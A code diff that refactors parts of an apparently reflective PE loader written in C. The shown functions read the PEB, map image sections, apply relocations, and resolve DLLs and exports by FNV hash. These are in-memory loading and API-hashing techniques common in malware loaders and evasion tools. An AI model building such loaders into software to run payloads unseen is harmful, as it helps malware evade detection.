@@ -14,8 +14,8 @@ DWORD OniFNV32(__in const char* cStr) {
 	unsigned int i;
 
 	for (i = 0; i < strlen(cStr); i++) {
-		dwHash = dwHash ^ (cStr[i]);			// xor next byte into the bottom of the hash
-		dwHash = dwHash * FNV_PRIME_32;		// Multiply by prime number found to work well
+		dwHash = dwHash ^ (cStr[i]);			
+		dwHash = dwHash * FNV_PRIME_32;		
 	}
 	return dwHash;
 }
@@ -90,23 +90,18 @@ BOOL OniGetLoaderSection(__in PONI_PARAM pOniParam) {
 		}
 	}
 	
-	do {
-		if (!bLoaderSectionFound) {
-			break;
-		}
+	
+	if (!bLoaderSectionFound) {
+		return FALSE;
+	}
 
 #ifdef _WIN32
-		pPeb = (_PPEB)__readfsdword(0x30);
+	pPeb = (_PPEB)__readfsdword(0x30);
 #else
-		pPeb = (_PPEB)__readgsdword(0x30);
+	pPeb = (_PPEB)__readgsdword(0x30);
 #endif
-
-		pOniParam->lpLoaderBase = pPeb->lpImageBaseAddress;
-		return TRUE;
-		
-	} while(0);
-	
-	return FALSE;
+	pOniParam->lpLoaderBase = pPeb->lpImageBaseAddress;
+	return TRUE;
 }
 
 BOOL OniDecompressInputBuffer(__in PONI_PARAM pOniParam) {
@@ -408,16 +403,17 @@ BOOL OniRelocateAndPivot(__in PONI_PARAM pOniParam, __in LPVOID pContFunc, __in 
 }	
 
 BOOL OniLoadImage(__in PONI_PARAM pOniParam) {
-	BOOL bRet = FALSE;
 	DWORD dwCentinel;
 	MEMORY_BASIC_INFORMATION mi;
 	PIMAGE_SECTION_HEADER	pSectionHeader;
 
-	if (!pOniParam) {
-		return bRet;
-	}
+	
 
 	do {
+		if (!pOniParam) {
+			return FALSE;
+		}
+		
 		dwCentinel = (DWORD)pOniParam->lpLoaderBase;
 		while (pOniParam->pVirtualQuery((LPVOID)dwCentinel, &mi, sizeof(mi))) {
 			if (mi.State == MEM_FREE) {
@@ -462,9 +458,11 @@ BOOL OniLoadImage(__in PONI_PARAM pOniParam) {
 				pSectionHeader[dwCentinel].SizeOfRawData
 			);
 		}
-		bRet = TRUE;
+		return TRUE;
+		
 	} while (0);
-	return bRet;
+	
+	return FALSE;
 }
 
 BOOL OniApplyRelocations(__in PONI_PARAM pOniParam) {
@@ -523,6 +521,7 @@ BOOL OniLoadAndRunImage(__in PONI_PARAM pOniParam) {
 			break;
 		}
 		return TRUE;
+		
 	} while(0);
 
 	return FALSE;
@@ -544,8 +543,6 @@ LPVOID OniFindDllExport(__in LPVOID dll_base, __in DWORD dwFNVHash) {
 	dwExportDescriptorOffset = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
 	pExportTable = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dll_base + dwExportDescriptorOffset);
 
-	// - The i-th element of the name table contains the export name
-	// - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
 	pdwNameTable = (PDWORD)((PBYTE)dll_base + pExportTable->AddressOfNames);
 	pwOrdinalTable = (PWORD)((PBYTE)dll_base + pExportTable->AddressOfNameOrdinals);
 	pdwFuncTable = (PDWORD)((PBYTE)dll_base + pExportTable->AddressOfFunctions);
@@ -571,15 +568,15 @@ LPVOID OniFindDllBase(__in DWORD dwFNVHash) {
 #ifdef _WIN32
 	pPeb = (_PPEB)__readfsdword(0x30);
 #else
-	pPeb = (_PPEB)__readgsdword(0x30);
+	pPeb = (_PPEB)__readgsdword(0x60);
 #endif
 	pLoader = pPeb->pLdr;
 	pHead = &pLoader->InMemoryOrderModuleList;
 	pCurr = pHead->Flink;
 
 	do {
-		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 		char* dllName;
+		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 		UnicodeToAnsi(dllEntry->BaseDllName.Buffer, &dllName);
 		dwHash = OniFNV32(StrToLower(dllName));
 		free(dllName);
